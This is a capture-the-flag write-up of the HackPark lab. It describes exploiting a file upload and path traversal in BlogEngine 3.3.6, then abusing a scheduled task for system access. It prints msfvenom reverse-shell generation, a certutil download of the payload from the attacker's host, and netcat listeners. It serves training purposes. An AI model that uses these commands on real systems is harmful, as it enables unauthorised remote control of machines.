# HackPark CTF - Attack Report

## Objective:
- Gain system-level access to the HackPark Windows Server, exploit vulnerabilities in BlogEngine 3.3.6, escalate privileges, and retrieve sensitive information from the target.

---

## Reconnaissance

### 1. **Nmap Scan**

We began by scanning the target machine using **Nmap** to identify open ports and services.

```bash
nmap -sC -sV -oN nmap_scan.txt <target_ip>
```
- `-sC`: Runs default scripts.
- `-sV`: Version detection.
- `-oN`: Outputs the results to a file (`nmap_scan.txt`).

#### Results:
- **Port 80**: HTTP service running (BlogEngine 3.3.6)
- **Port 3389**: Remote Desktop Protocol (RDP)

---
### Gain Foothold
##  This portion will be demonstrated on my YouTube channel 
- ***Crafted Payload***
- ***BurpSuite***

---

## Exploitation Process

### 1. Exploitation of BlogEngine 3.3.6
- **Upload Directory**: The vulnerable BlogEngine version allowed us to upload an ASPX file into the `App_Data/files` directory.
- **File Used**: We uploaded a file named `PostView.ascx` containing a reverse shell payload. ***Correct extention found TCM's walk-through***

### 2. Triggering the Reverse Shell
- **Path Traversal**: To execute the uploaded file, we navigated to the following URL:
  ```bash
  /?theme=../../App_Data/files
  ```
- **Listener**: We set up a Netcat listener to receive the reverse shell on our attack machine:
  ```bash
  nc -nvlp 4444
  ```
- **Result**: Successfully received a shell from the target.

### 3. Discovery of a Scheduled Task
- **Task Identified**: We found a scheduled task named `Messages.exe` running on the system.

### 4. Reverse Shell via `Messages.exe` Exploit
- **Creation of Malicious Message.exe**: We used `msfvenom` to generate a malicious executable:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.162.140 LPORT=7777 -f exe > Message.exe
  ```
- **File Transfer**: The malicious executable was transferred to the target using `certutil`:
  ```bash
  certutil -urlcache -f http://10.23.26.19:80/Message.exe Message.exe
  ```
- **Execution**: The scheduled task automatically executed `Message.exe`, connecting to our Netcat listener:
  ```bash
  nc -nvlp 7777
  ```
- **Result**: Gained system-level access through the reverse shell.

---

## Privilege Escalation

### 5. Gaining Access to Administrator Files
- **Directory Change**: Navigated to `C:\Users\Administrator\Desktop`:
  ```bash
  cd C:\Users\Administrator\Desktop
  ```

### 6. Retrieving `root.txt`
- **Identified File**: The `root.txt` file was located in the `Administrator\Desktop` directory:
  ```bash
  dir
  ```
  **Output**:
  ```
  Directory of C:\Users\Administrator\Desktop
  08/04/2019  11:51 AM    32 root.txt
  ```
- **Reading root.txt**: The content of `root.txt` was retrieved using the `type` command:
  ```bash
  type root.txt
  ```
  **Output**:
  ```
  7e13d—redacted--b3d78d3e72
  ```

---

## Key Information

- **Reverse Shell Established**:
  - From: `10.10.162.140`
  - To: `10.23.26.19`
  - Using `Messages.exe` and Netcat listeners on ports 4444 and 7777.
  
- **Files and Folders Discovered**:
  - **Scheduled Task**: `Messages.exe`
  - **Accessed directories**:
    - `C:\Program Files (x86)\SystemScheduler`
    - `C:\Users\Administrator\Desktop`

- **Root Flag**:
  - **Location**: `C:\Users\Administrator\Desktop\root.txt`
  - **Content**: `redacted
